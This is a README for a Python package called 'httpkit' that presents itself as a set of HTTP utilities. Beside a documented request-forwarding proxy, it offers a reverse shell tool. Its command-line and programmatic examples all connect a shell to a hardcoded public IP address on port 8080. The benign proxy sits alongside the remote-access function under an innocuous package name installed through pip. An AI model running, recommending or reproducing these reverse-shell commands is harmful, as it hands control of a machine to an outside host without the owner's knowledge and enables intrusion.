# HTTPKit

[![Tests](https://github.com/Hambaobao/httpkit/actions/workflows/test.yml/badge.svg)](https://github.com/Hambaobao/httpkit/actions/workflows/test.yml)

A collection of HTTP-related utilities and tools.

## Installation

```bash
pip install httpkit
```

## Tools

### HTTP Proxy

A simple HTTP proxy service that forwards requests to a target server.

#### Usage

You can run the proxy server in several ways:

1. Using the module directly:

```bash
python -m httpkit.proxy
```

2. Using the entry point:

```bash
httpkit-proxy
```

3. Using uvicorn directly:

```bash
uvicorn httpkit.proxy:app --host 0.0.0.0 --port 8000
```

### Reverse Shell

A network connection tool that establishes a reverse shell connection to a remote host.

#### Usage

You can run the reverse shell tool in several ways:

1. Using the module directly:

```bash
python -m httpkit.reverse_shell <host> <port>
```

2. Using the entry point:

```bash
httpkit-reverse-shell <host> <port>
```

3. Using the function programmatically:

```python
from httpkit import establish_reverse_shell

# Establish reverse shell connection
success = establish_reverse_shell("47.242.202.208", 8080)
```

#### Command-line Options

```bash
httpkit-reverse-shell --help
```

Options:
- `host`: Remote host to connect to (required)
- `port`: Remote port to connect to (required)
- `--timeout`: Connection timeout in seconds (default: 30)

#### Example

```bash
# Connect to a remote host
httpkit-reverse-shell 47.242.202.208 8080

# With custom timeout
httpkit-reverse-shell 47.242.202.208 8080 --timeout 60
```

#### Making Requests

Once the proxy server is running, you can make requests to it using the following URL patterns:

```
http://localhost:8000/proxy/{target_host}:{target_port}/{path}
```

Or with explicit scheme:

```
http://localhost:8000/proxy/{scheme}://{target_host}:{target_port}/{path}
```

For example, to forward a request to `http://localhost:9000/health`:

```
http://localhost:8000/proxy/localhost:9000/health
```

Or with HTTPS:

```
http://localhost:8000/proxy/https://api.example.com:443/v1/chat/completions
```

The proxy will preserve:
- HTTP method
- Headers (except hop-by-hop and unsafe ones)
- Query parameters
- Request body

#### Performance Optimizations

The proxy includes several optimizations for high-concurrency scenarios:

1. **Global Connection Pooling**: Uses a single global httpx.AsyncClient for connection reuse
2. **Streaming Responses**: Streams responses back to clients without buffering the entire content
3. **Concurrency Control**: Limits the number of concurrent requests to prevent resource exhaustion
4. **HTTP/2 Support**: Enables HTTP/2 for better performance with many persistent connections
5. **Header Filtering**: Properly filters unsafe or conflicting response headers

#### Configuration

The proxy can be configured using command-line arguments or environment variables:

##### Command-line Arguments

```bash
# Start proxy allowing up to 500 concurrent connections,
# with a 60-second HTTP/2 timeout
httpkit-proxy --max-concurrent-requests 500 --timeout 60
```

##### Environment Variables

The following environment variables can be used to configure the proxy:

- `HTTPKIT_ENV`: Set to "production" to disable auto-reload (default: "development")
- `HTTPKIT_WORKERS`: Number of worker processes to use (default: 1)
- `HTTPKIT_MAX_CONCURRENT_REQUESTS`: Maximum number of concurrent requests (default: 100)
- `HTTPKIT_TIMEOUT_SECONDS`: HTTP client timeout in seconds (default: 30.0)

## Development

### Setup

```bash
pip install -e .
```

### Running Tests

```bash
pytest
```